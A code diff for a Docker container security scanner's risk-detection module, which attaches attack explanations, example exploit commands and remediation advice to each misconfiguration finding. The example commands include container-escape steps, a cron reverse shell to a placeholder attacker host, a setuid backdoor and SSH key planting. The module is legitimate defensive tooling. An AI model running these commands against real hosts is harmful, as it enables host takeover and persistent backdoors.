@@ -1,24 +1,22 @@
 """
-Risk Detection - Comprehensive security risk detection for Docker containers.
+Risk Detection - Security risk detection for Docker containers.
 
-This module implements detection rules for identifying dangerous configurations
-that could lead to container escape, privilege escalation, or data exfiltration.
+Every finding corresponds to a real attack: if the tool cannot finish the
+sentence "because of this setting, an attacker inside that container can
+[specific action]", the finding does not belong here.
 
 Detection categories:
-- CRITICAL: Docker socket access, privileged mode, critical capabilities
-- HIGH: Dangerous capabilities, sensitive mounts, host namespace sharing
-- MEDIUM: Port exposure, missing security profiles, resource limits
-- LOW: Running as root, unpinned images
+- CRITICAL: Docker socket, privileged mode, SYS_ADMIN, writable dangerous
+            host mounts, host PID namespace
+- HIGH:     Host network mode, SYS_PTRACE
 """
 
 from __future__ import annotations
 
-from dataclasses import dataclass
-from pathlib import Path
 from typing import Optional
 
-from dockerscope.core.discovery import ContainerInfo
 from dockerscope.config.load_config import load_config
+from dockerscope.core.discovery import ContainerInfo
 from dockerscope.models.risk import Risk
 
 # Dangerous paths for container mounts
@@ -33,24 +31,7 @@ DANGEROUS_HOST_MOUNTS = {
     "/usr/sbin",  # System admin binaries
     "/proc",  # Process information
     "/sys",  # System information
-    "/dev"  # Device files
-}
-
-# Linux capabilities that pose security risks
-CRITICAL_CAPABILITIES = {
-    "SYS_ADMIN",  # Near-root privileges, can mount filesystems
-    "SYS_MODULE",  # Can load kernel modules
-}
-
-DANGEROUS_CAPABILITIES = {
-    "SYS_RAWIO",  # Raw I/O access
-    "SYS_PTRACE",  # Can debug/inject into other processes
-    "SYS_BOOT",  # Can reboot system
-    "NET_ADMIN",  # Network administration
-    "DAC_OVERRIDE",  # Bypass file permission checks
-    "DAC_READ_SEARCH",  # Bypass file read permissions
-    "SETUID",  # Can change user IDs
-    "SETGID",  # Can change group IDs
+    "/dev",  # Device files
 }
 
 # Dangerous namespace modes
@@ -59,138 +40,81 @@ DANGEROUS_NAMESPACE_MODES = {"host"}
 
 def _is_dangerous_mount(source: str, destination: str) -> bool:
     """
-    Check if a mount is considered dangerous.
+    Check if a mount targets a dangerous host path.
 
     Checks both exact matches and subpaths of dangerous locations.
     For example, /etc/ssh is dangerous because it's under /etc.
-
-    Args:
-        source: Mount source path
-        destination: Mount destination path
-
-    Returns:
-        True if mount is dangerous
     """
     if not source:
         return False
 
     source = str(source)
 
-    # Direct match
     if source in DANGEROUS_HOST_MOUNTS:
         return True
 
-    # Check if source is a subpath of any dangerous mount
-    # e.g., /etc/ssh, /var/lib/docker/overlay2
     for base in DANGEROUS_HOST_MOUNTS:
         if base == "/":
-            continue  # Root ("/") exact match already handled above
+            continue
         if source.startswith(base + "/"):
             return True
 
     return False
 
 
-def _has_critical_capability(capabilities: list[str]) -> Optional[str]:
-    """
-    Check for critical added capabilities that enable privilege escalation.
-
-    Only CAP_ADD entries are checked. CAP_DROP entries are security-positive
-    and should not be flagged.
-
-    Args:
-        capabilities: List of capabilities (with CAP_ADD:/CAP_DROP: prefix)
-
-    Returns:
-        Name of first critical capability found, or None
-    """
-    for cap in capabilities:
-        if not cap.startswith("CAP_ADD:"):
-            continue
-        cap_name = cap.removeprefix("CAP_ADD:")
-        if cap_name in CRITICAL_CAPABILITIES:
-            return cap_name
-    return None
-
-
-def _has_dangerous_capability(capabilities: list[str]) -> Optional[str]:
-    """
-    Check for dangerous added capabilities that expand attack surface.
-
-    Only CAP_ADD entries are checked. CAP_DROP entries are security-positive.
-
-    Args:
-        capabilities: List of capabilities (with CAP_ADD:/CAP_DROP: prefix)
-
-    Returns:
-        Name of first dangerous capability found, or None
-    """
-    for cap in capabilities:
-        if not cap.startswith("CAP_ADD:"):
-            continue
-        cap_name = cap.removeprefix("CAP_ADD:")
-        if cap_name in DANGEROUS_CAPABILITIES:
-            return cap_name
-    return None
-
-
 def _is_running_as_root(container: ContainerInfo) -> bool:
-    """
-    Check if container is running as root user.
-
-    Note: Requires 'user' field in ContainerInfo.
-    Returns False if field not available.
-
-    Args:
-        container: Container information
-
-    Returns:
-        True if running as root
-    """
-    # Check if container has user field
+    """Check if container is running as root user."""
     user = getattr(container, 'user', None)
     if user is None:
         return False
-
-    # Root can be specified as "root", "0", or empty string
     return user in ("root", "0", "")
+
+
+def _root_context_note(container: ContainerInfo) -> str:
+    """Return a note about root status to append to attack explanations."""
+    if _is_running_as_root(container):
+        return " This container runs as root, so no privilege escalation is needed inside the container."
+    return ""
 
 
 def evaluate_container_risks(container: ContainerInfo) -> list[Risk]:
     """
     Evaluate a container for security risks.
 
-    Implements comprehensive detection rules across all severity levels.
-    Each rule generates a Risk object with detailed information for
-    remediation and attack path analysis.
-
-    Args:
-        container: Container to evaluate
-
-    Returns:
-        List of detected Risk objects
+    Only returns findings where we can describe the exact commands an
+    attacker would run to exploit the misconfiguration.
     """
     risks: list[Risk] = []
+    root_note = _root_context_note(container)
 
-    # ========================================================================
-    # CRITICAL RISKS
-    # ========================================================================
-
-    # Rule 1: Privileged container
+    # === CRITICAL: Privileged container ===
     if container.privileged:
         risks.append(
             Risk(
                 container=container.name,
                 risk_type="privileged_container",
-                description="Container is running in privileged mode.",
-                details={
-                    "network_mode": container.network_mode,
-                    "impact": "Full host access via device access and capability bypass"
-                },
+                severity="CRITICAL",
+                description="Container runs in privileged mode.",
+                attack_explanation=(
+                    "An attacker inside this container has full access to all host "
+                    "devices and can escape to the host with a single command. "
+                    "Privileged mode disables almost all container isolation."
+                    + root_note
+                ),
+                attack_commands=[
+                    "nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash",
+                    "mount /dev/sda1 /mnt && chroot /mnt",
+                ],
+                remediation=(
+                    "Remove 'privileged: true' from your docker-compose.yml. "
+                    "If the container needs specific device access, use 'devices:' "
+                    "to grant only what is needed."
+                ),
+                details={"network_mode": container.network_mode},
             )
         )
 
-    # Rule 2: Docker socket mount
+    # === CRITICAL: Docker socket mount ===
     for mount in container.mounts:
         src = mount.get("Source") or mount.get("src") or ""
         dst = mount.get("Destination") or mount.get("dst") or ""
@@ -200,197 +124,215 @@ def evaluate_container_risks(container: ContainerInfo) -> list[Risk]:
                 Risk(
                     container=container.name,
                     risk_type="docker_sock_mount",
+                    severity="CRITICAL",
                     description="Container has access to the Docker socket.",
-                    details={
-                        "source": src,
-                        "destination": dst,
-                        "impact": "Can control Docker daemon and create privileged containers"
-                    },
+                    attack_explanation=(
+                        "An attacker inside this container can control the Docker "
+                        "daemon. They can create a new privileged container that "
+                        "mounts the host root filesystem, giving them full root "
+                        "access to the host in seconds."
+                        + root_note
+                    ),
+                    attack_commands=[
+                        (
+                            "curl --unix-socket /var/run/docker.sock "
+                            "http://localhost/v1.41/containers/create "
+                            "-d '{\"Image\":\"alpine\",\"HostConfig\":"
+                            "{\"Privileged\":true,\"Binds\":[\"/:/host\"]}}'"
+                        ),
+                    ],
+                    remediation=(
+                        "Remove the docker.sock volume mount from your docker-compose.yml:\n"
+                        "  - /var/run/docker.sock:/var/run/docker.sock  # DELETE THIS LINE\n\n"
+                        "If this container genuinely needs Docker API access (e.g., Portainer, "
+                        "Watchtower), use a docker-socket-proxy (tecnativa/docker-socket-proxy) "
+                        "to limit which API endpoints are accessible."
+                    ),
+                    details={"source": src, "destination": dst},
                 )
             )
 
-    # Rule 3: Critical capabilities
-    critical_cap = _has_critical_capability(container.capabilities)
-    if critical_cap:
-        risks.append(
-            Risk(
-                container=container.name,
-                risk_type="critical_capability",
-                description=f"Container has critical capability: {critical_cap}",
-                details={
-                    "capability": critical_cap,
-                    "impact": "Near-root privileges, can bypass most security controls"
-                },
+    # === CRITICAL: SYS_ADMIN capability ===
+    for cap in container.capabilities:
+        if not cap.startswith("CAP_ADD:"):
+            continue
+        cap_name = cap.removeprefix("CAP_ADD:")
+        if cap_name == "SYS_ADMIN":
+            risks.append(
+                Risk(
+                    container=container.name,
+                    risk_type="cap_sys_admin",
+                    severity="CRITICAL",
+                    description="Container has CAP_SYS_ADMIN capability.",
+                    attack_explanation=(
+                        "An attacker inside this container can mount the host "
+                        "filesystem. SYS_ADMIN grants near-root privileges "
+                        "including the ability to mount devices, create namespaces, "
+                        "and bypass most container isolation."
+                        + root_note
+                    ),
+                    attack_commands=[
+                        "mount /dev/sda1 /mnt",
+                        "cat /mnt/etc/shadow",
+                    ],
+                    remediation=(
+                        "Remove 'SYS_ADMIN' from cap_add in your docker-compose.yml. "
+                        "This capability is almost never needed. If the container "
+                        "requires specific mount operations, consider using a more "
+                        "targeted solution."
+                    ),
+                    details={"capability": cap_name},
+                )
             )
-        )
 
-    # ========================================================================
-    # HIGH RISKS
-    # ========================================================================
-
-    # Rule 4: Host network mode
-    if container.network_mode == "host":
-        risks.append(
-            Risk(
-                container=container.name,
-                risk_type="host_network_mode",
-                description="Container is using host network mode.",
-                details={
-                    "impact": "Can see all host network traffic and bind to any port"
-                },
-            )
-        )
-
-    # Rule 5: Host PID namespace (if available)
+    # === CRITICAL: Host PID namespace ===
     pid_mode = getattr(container, 'pid_mode', None)
     if pid_mode and pid_mode in DANGEROUS_NAMESPACE_MODES:
         risks.append(
             Risk(
                 container=container.name,
                 risk_type="host_pid_mode",
-                description="Container shares host PID namespace.",
-                details={
-                    "pid_mode": pid_mode,
-                    "impact": "Can see and interact with all host processes"
-                },
+                severity="CRITICAL",
+                description="Container shares the host PID namespace.",
+                attack_explanation=(
+                    "An attacker inside this container can see all host processes "
+                    "and use nsenter to escape into the host's namespaces. With "
+                    "access to PID 1, they can get a root shell on the host."
+                    + root_note
+                ),
+                attack_commands=[
+                    "nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash",
+                ],
+                remediation=(
+                    "Remove 'pid: host' from your docker-compose.yml. Most containers "
+                    "do not need to see host processes."
+                ),
+                details={"pid_mode": pid_mode},
             )
         )
 
-    # Rule 6: Dangerous host mounts
+    # === CRITICAL: Dangerous writable host mounts ===
     for mount in container.mounts:
         src = mount.get("Source") or mount.get("src") or ""
         dst = mount.get("Destination") or mount.get("dst") or ""
         mode = mount.get("Mode", "rw")
 
-        if _is_dangerous_mount(src, dst):
-            # Skip docker.sock (already checked)
-            if src in DOCKER_SOCK_PATHS:
-                continue
-
-            is_writable = "rw" in mode.lower()
-
-            risks.append(
-                Risk(
-                    container=container.name,
-                    risk_type="dangerous_host_mount",
-                    description=f"Container mounts sensitive host path: {src}",
-                    details={
-                        "source": src,
-                        "destination": dst,
-                        "mode": mode,
-                        "writable": is_writable,
-                        "impact": f"{'Can modify' if is_writable else 'Can read'} sensitive host files"
-                    },
-                )
-            )
-
-    # Rule 7: Dangerous capabilities
-    dangerous_cap = _has_dangerous_capability(container.capabilities)
-    if dangerous_cap:
-        risks.append(
-            Risk(
-                container=container.name,
-                risk_type="dangerous_capability",
-                description=f"Container has dangerous capability: {dangerous_cap}",
-                details={
-                    "capability": dangerous_cap,
-                    "impact": "Extended privileges that may enable container escape"
-                },
-            )
-        )
-
-    # ========================================================================
-    # MEDIUM RISKS
-    # ========================================================================
-
-    # Rule 8: Ports exposed to all interfaces (0.0.0.0)
-    for container_port, bindings in (container.ports or {}).items():
-        if not bindings:
+        if not _is_dangerous_mount(src, dst):
             continue
-        for binding in bindings:
-            host_ip = binding.get("HostIp", "")
-            host_port = binding.get("HostPort", "")
+        if src in DOCKER_SOCK_PATHS:
+            continue
 
-            # 0.0.0.0, empty string, or :: means all interfaces
-            if host_ip in ("0.0.0.0", "", "::"):
-                risks.append(
-                    Risk(
-                        container=container.name,
-                        risk_type="wide_exposed_port",
-                        description=f"Port {container_port} is exposed on all interfaces (0.0.0.0).",
-                        details={
-                            "container_port": container_port,
-                            "host_ip": host_ip or "0.0.0.0",
-                            "host_port": host_port,
-                            "impact": "Service accessible from any network interface"
-                        },
-                    )
-                )
+        is_writable = "rw" in mode.lower()
 
-    # Rule 9: No security profiles (if available)
-    security_opt = getattr(container, 'security_opt', None)
-    if security_opt is not None:
-        # Check if security profiles are explicitly disabled
-        if 'apparmor=unconfined' in security_opt or 'seccomp=unconfined' in security_opt:
-            risks.append(
-                Risk(
-                    container=container.name,
-                    risk_type="no_security_profiles",
-                    description="Container has security profiles disabled.",
-                    details={
-                        "security_opt": security_opt,
-                        "impact": "Fewer restrictions on syscalls and operations"
-                    },
-                )
-            )
+        if not is_writable:
+            # Read-only mounts to sensitive paths are not escape vectors
+            continue
 
-    # Rule 10: No resource limits (if available)
-    resources = getattr(container, 'resources', None)
-    if resources is not None:
-        # Check if no memory or CPU limits are set
-        has_limits = any(resources.values()) if isinstance(resources, dict) else False
-        if not has_limits:
-            risks.append(
-                Risk(
-                    container=container.name,
-                    risk_type="no_resource_limits",
-                    description="Container has no CPU or memory limits set.",
-                    details={
-                        "impact": "Can consume excessive host resources (DoS potential)"
-                    },
-                )
-            )
+        # Determine specific attack based on the path
+        if src == "/" or src == "/etc" or src.startswith("/etc/"):
+            attack_cmds = [
+                f"echo '* * * * * root bash -i >& /dev/tcp/ATTACKER/4444 0>&1' > {dst}/cron.d/backdoor",
+            ]
+        elif src in ("/usr/bin", "/usr/sbin") or src.startswith("/usr/bin/") or src.startswith("/usr/sbin/"):
+            attack_cmds = [
+                f"cp /bin/bash {dst}/evil && chmod +s {dst}/evil",
+            ]
+        elif src == "/root" or src.startswith("/root/"):
+            attack_cmds = [
+                f"echo 'attacker-key' >> {dst}/.ssh/authorized_keys",
+            ]
+        else:
+            attack_cmds = [
+                f"# Write malicious files to {dst} (mounted from host {src})",
+            ]
 
-    # ========================================================================
-    # LOW RISKS
-    # ========================================================================
-
-    # Rule 11: Running as root
-    if _is_running_as_root(container):
         risks.append(
             Risk(
                 container=container.name,
-                risk_type="running_as_root",
-                description="Container process is running as root user.",
+                risk_type="dangerous_host_mount",
+                severity="CRITICAL",
+                description=f"Container has writable mount to sensitive host path: {src}",
+                attack_explanation=(
+                    f"An attacker inside this container can write to {src} on "
+                    f"the host. Depending on the path, this enables writing cron "
+                    f"jobs, modifying system binaries, planting SSH keys, or "
+                    f"other forms of persistent host compromise."
+                    + root_note
+                ),
+                attack_commands=attack_cmds,
+                remediation=(
+                    f"Remove the volume mount or make it read-only:\n"
+                    f"  - {src}:{dst}:ro  # Add :ro to make read-only\n\n"
+                    f"If write access is truly needed, mount only the specific "
+                    f"subdirectory required instead of the entire {src} tree."
+                ),
                 details={
-                    "impact": "If container is compromised, attacker has root privileges inside container"
+                    "source": src,
+                    "destination": dst,
+                    "mode": mode,
+                    "writable": True,
                 },
             )
         )
 
-    # Rule 12: Unpinned image tag (using :latest)
-    if container.image.endswith(":latest") or ":" not in container.image:
+    # === HIGH: Host network mode ===
+    if container.network_mode == "host":
         risks.append(
             Risk(
                 container=container.name,
-                risk_type="unpinned_image",
-                description="Container using unpinned image tag (:latest or no tag).",
-                details={
-                    "image": container.image,
-                    "impact": "Image may change unexpectedly, introducing vulnerabilities"
-                },
+                risk_type="host_network_mode",
+                severity="HIGH",
+                description="Container uses host network mode.",
+                attack_explanation=(
+                    "An attacker inside this container shares the host's network "
+                    "stack. They can sniff traffic on all host interfaces, bind to "
+                    "any port, access services listening on localhost (databases, "
+                    "admin panels), and ARP spoof other devices on the LAN."
+                    + root_note
+                ),
+                attack_commands=[
+                    "tcpdump -i any -w capture.pcap",
+                    "curl http://127.0.0.1:9090  # access host-only services",
+                ],
+                remediation=(
+                    "Replace 'network_mode: host' with bridge networking and "
+                    "explicit port mappings:\n"
+                    "  ports:\n"
+                    "    - \"8080:8080\"  # Map only the ports you need"
+                ),
+                details={},
             )
         )
+
+    # === HIGH: SYS_PTRACE capability ===
+    for cap in container.capabilities:
+        if not cap.startswith("CAP_ADD:"):
+            continue
+        cap_name = cap.removeprefix("CAP_ADD:")
+        if cap_name == "SYS_PTRACE":
+            risks.append(
+                Risk(
+                    container=container.name,
+                    risk_type="cap_sys_ptrace",
+                    severity="HIGH",
+                    description="Container has CAP_SYS_PTRACE capability.",
+                    attack_explanation=(
+                        "An attacker inside this container can use ptrace to attach "
+                        "to and inject code into other processes. When combined with "
+                        "host PID mode, this enables process injection on the host."
+                        + root_note
+                    ),
+                    attack_commands=[
+                        "# With host PID mode: inject into host processes",
+                        "nsenter --target <HOST_PID> --mount --uts --ipc --net --pid -- /bin/bash",
+                    ],
+                    remediation=(
+                        "Remove 'SYS_PTRACE' from cap_add in your docker-compose.yml. "
+                        "This capability is rarely needed outside of debugging scenarios."
+                    ),
+                    details={"capability": cap_name},
+                )
+            )
 
     return risks
 
@@ -411,17 +353,9 @@ def filter_risks_with_whitelist(
           portainer:
             allow:
               - docker_sock_mount
-              - wide_exposed_port
           watchtower:
             allow:
               - docker_sock_mount
-
-    Args:
-        risks: List of detected risks
-        cfg: Configuration dictionary (loads from file if None)
-
-    Returns:
-        Filtered list of risks (whitelisted risks removed)
     """
     if cfg is None:
         cfg = load_config() or {}
@@ -434,127 +368,17 @@ def filter_risks_with_whitelist(
     filtered: list[Risk] = []
 
     for risk in risks:
-        # Check if this container is in whitelist
         container_cfg = whitelist_cfg.get(risk.container)
 
         if not isinstance(container_cfg, dict):
-            # No whitelist for this container
             filtered.append(risk)
             continue
 
-        # Get allowed risk types for this container
         allowed = set(container_cfg.get("allow", []))
 
-        # Skip if this risk type is allowed
         if risk.risk_type in allowed:
             continue
 
         filtered.append(risk)
 
     return filtered
-
-
-def get_risk_severity(risk_type: str) -> str:
-    """
-    Get severity level for a risk type.
-
-    Args:
-        risk_type: Risk type identifier
-
-    Returns:
-        "CRITICAL", "HIGH", "MEDIUM", or "LOW"
-    """
-    critical_types = {
-        "docker_sock_mount",
-        "privileged_container",
-        "critical_capability",
-    }
-
-    high_types = {
-        "dangerous_host_mount",
-        "host_network_mode",
-        "host_pid_mode",
-        "dangerous_capability",
-    }
-
-    medium_types = {
-        "wide_exposed_port",
-        "no_security_profiles",
-        "no_resource_limits",
-    }
-
-    if risk_type in critical_types:
-        return "CRITICAL"
-    elif risk_type in high_types:
-        return "HIGH"
-    elif risk_type in medium_types:
-        return "MEDIUM"
-    else:
-        return "LOW"
-
-
-def get_remediation_advice(risk: Risk) -> str:
-    """
-    Get specific remediation advice for a risk.
-
-    Provides actionable steps to fix or mitigate the identified risk.
-
-    Args:
-        risk: Risk object
-
-    Returns:
-        Remediation advice string
-    """
-    remediations = {
-        "docker_sock_mount": (
-            "Remove the docker.sock mount from the container. "
-            "If Docker API access is required, use Docker API over TCP with TLS authentication."
-        ),
-        "privileged_container": (
-            "Remove the --privileged flag. "
-            "Grant only specific capabilities needed using --cap-add instead."
-        ),
-        "critical_capability": (
-            f"Remove the {risk.details.get('capability', 'capability')} capability. "
-            "Only grant minimal capabilities required for container function."
-        ),
-        "dangerous_capability": (
-            f"Remove the {risk.details.get('capability', 'capability')} capability if not essential. "
-            "Use more specific, limited permissions instead."
-        ),
-        "dangerous_host_mount": (
-            f"Remove or restrict the mount of {risk.details.get('source', 'path')}. "
-            "If absolutely needed, mount as read-only using :ro flag."
-        ),
-        "host_network_mode": (
-            "Use bridge networking instead of host mode. "
-            "Map only specific ports using -p flag."
-        ),
-        "host_pid_mode": (
-            "Remove --pid=host flag unless absolutely necessary for monitoring tools."
-        ),
-        "wide_exposed_port": (
-            f"Bind port to specific interface (e.g., 127.0.0.1:{risk.details.get('host_port', 'PORT')}) "
-            "instead of 0.0.0.0. Use firewall rules to restrict external access."
-        ),
-        "no_security_profiles": (
-            "Enable default security profiles (AppArmor/Seccomp) or create custom ones. "
-            "Remove 'unconfined' security options."
-        ),
-        "no_resource_limits": (
-            "Set CPU and memory limits using --memory and --cpus flags to prevent resource exhaustion."
-        ),
-        "running_as_root": (
-            "Run container as non-root user. "
-            "Add USER directive in Dockerfile or use --user flag at runtime."
-        ),
-        "unpinned_image": (
-            f"Use specific image tag instead of :latest. "
-            f"Example: {risk.details.get('image', 'image').replace(':latest', ':1.0.0').replace('latest', '1.0.0')}"
-        ),
-    }
-
-    return remediations.get(
-        risk.risk_type,
-        "Review container security configuration and apply least privilege principles."
-    )
